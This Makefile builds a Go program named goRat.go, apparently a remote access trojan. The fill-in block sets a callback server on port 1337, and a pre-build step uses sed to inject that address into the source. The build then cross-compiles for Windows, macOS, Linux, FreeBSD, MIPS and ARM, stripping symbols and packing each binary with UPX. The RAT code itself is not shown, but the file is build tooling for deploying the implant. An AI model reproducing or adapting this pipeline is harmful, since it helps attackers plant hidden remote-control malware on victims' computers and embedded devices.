################
# FILL THESE IN BEFORE BUILDING
SERVER_DEST = 000.000.000.000:1337
# SERVER_DEST = https:\/\/yoururl.com\/sus:443
EXE_NAME = sus
############

# Vars and Flags
VERSION := $(shell git rev-list --count HEAD)
BUILD_DIR = BUILD
SRC_DIR = .BUILD_SOURCE
LDFLAGS = -ldflags="-s -w"

# Source Files
CORE = goRat.go
COMPILE_CORE = '$(SRC_DIR)'/goRat.go

all: pre-build
	CGO_ENABLED=0 GOOS=linux go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_linux $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_linux
	CGO_ENABLED=0 GOOS=darwin go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_macos $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_macos
	CGO_ENABLED=0 GOOS=windows go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_windows.exe $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_windows.exe
	CGO_ENABLED=0 GOOS=freebsd go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_freebsd $(LDFLAGS) $(COMPILE_CORE)
	# RIP no UPX for freebsd
	
	CGO_ENABLED=0 GOOS=linux GOARCH=mips go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_mips $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_mips
	
	GOOS=linux GOARCH=arm GOARM=5 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM5 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM5
	GOOS=linux GOARCH=arm GOARM=6 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM6 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM6
	GOOS=linux GOARCH=arm GOARM=7 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM7 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm_ARM7
	
	GOOS=linux GOARCH=arm64 GOARM=5 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM5 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM5
	GOOS=linux GOARCH=arm64 GOARM=6 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM6 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM6
	GOOS=linux GOARCH=arm64 GOARM=7 go build -o $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM7 $(LDFLAGS) $(COMPILE_CORE)
	upx $(BUILD_DIR)/$(EXE_NAME)_v$(VERSION)_arm64_ARM7

pre-build:
	# Clean Before Stage
	rm -rf $(BUILD_DIR)
	rm -rf $(SRC_DIR)
	mkdir $(BUILD_DIR)
	mkdir $(SRC_DIR)

	# Stage Files and Inject Vars Before Compile
	cp $(CORE) $(COMPILE_CORE)
	sed -i "s/@ENDPOINT_HERE@/$(SERVER_DEST)/g" $(COMPILE_CORE)
